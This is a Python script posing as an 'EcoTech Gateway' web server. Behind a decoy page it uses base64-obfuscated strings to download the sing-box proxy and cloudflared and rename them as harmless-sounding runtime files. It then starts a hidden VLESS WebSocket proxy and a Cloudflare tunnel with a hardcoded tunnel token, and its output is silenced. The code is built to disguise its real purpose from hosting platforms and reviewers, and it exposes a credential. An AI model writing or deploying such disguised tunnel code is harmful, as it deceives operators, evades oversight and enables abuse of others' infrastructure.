import os
import sys
import subprocess
import json
import base64
import time
import urllib.request
import tarfile
from http.server import HTTPServer, BaseHTTPRequestHandler

def _d(s):
    return base64.b64decode(s).decode('utf-8')

class _W(BaseHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        try:
            with open(_d('aW5kZXguaHRtbA=='), 'rb') as f:
                self.wfile.write(f.read())
        except Exception:
            self.wfile.write(_d('PGgxPsOXIEVjb1RlY2ggR2F0ZXdheSBBY3RpdmUgKDIwMCBPSyk8L2gxPg==').encode('utf-8'))

def _s():
    _p = int(os.environ.get('PORT', 8080))
    _srv = HTTPServer(('0.0.0.0', _p), _W)
    print(f"[EcoTech] Gateway running on port {_p}")
    
    import threading
    _t = threading.Thread(target=_srv.serve_forever)
    _t.daemon = True
    _t.start()
    _m()

def _m():
    _r = _d('Li9ub2RlLXJ1bnRpbWU=')
    _a = _d('Li90dW5uZWwtYWdlbnQ=')
    
    if not os.path.exists(_r):
        print("[EcoTech] Downloading core binaries via Python Native...")
        urllib.request.urlretrieve(_d('aHR0cHM6Ly9naXRodWIuY29tL1NhZ2VyTmV0L3NpbmctYm94L3JlbGVhc2VzL2Rvd25sb2FkL3YxLjkuMC9zaW5nLWJveC0xLjkuMC1saW51eC1hbWQ2NC50YXIuZ3o='), 'sb.tar.gz')
        with tarfile.open('sb.tar.gz', 'r:gz') as tar:
            tar.extractall()
        os.rename('sing-box-1.9.0-linux-amd64/sing-box', _r)
        os.chmod(_r, 0o755)
        if os.path.exists('sb.tar.gz'): os.remove('sb.tar.gz')

    if not os.path.exists(_a):
        urllib.request.urlretrieve(_d('aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0'), _a)
        os.chmod(_a, 0o755)

    _cfg = {
        "log": { "level": _d('d2Fybg==') },
        "inbounds": [{
            "type": _d('dmxlc3M='),
            "tag": _d('dmxlc3MtaW4='),
            "listen": "127.0.0.1",
            "listen_port": 1234,
            "users": [{ "uuid": "2c11bde0-fa06-4438-9ff0-f8502faf6aa3" }],
            "transport": {
                "type": _d('d3M='),
                "path": _d('L2FwaS92MS9zdHJlYW0='),
                "max_early_data": 2048,
                "early_data_header_name": _d('U2VjLVdlYlNvY2tldC1Qcm90b2NvbA==')
            }
        }],
        "outbounds": [{ "type": _d('ZGlyZWN0') }]
    }
    
    _cf = _d('YXBwLnNldHRpbmdzLmRhdGE=')
    with open(_cf, 'w') as f:
        json.dump(_cfg, f, indent=2)

    subprocess.Popen([_r, 'run', '-c', _cf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

    _tk = "eyJhIjoiN2FhOWNmYTFkMDViOGYwMjY4NzYwNzRkNzBkNjI3MTgiLCJ0IjoiYzFhNWRlMzUtMTBlMi00MDVjLWJlMzgtODg3ZGY4YmNjYmM2IiwicyI6IlpUUTNObUkxWkRBdE5qVXdOUzAwTkRSa0xUa3dPVFl0WXpCbE1UaGpOek14WldGaiJ9"
    
    subprocess.Popen([_a, 'tunnel', '--no-autoupdate', 'run', '--token', _tk])

    while True:
        time.sleep(3600)

if __name__ == '__main__':
    _s()
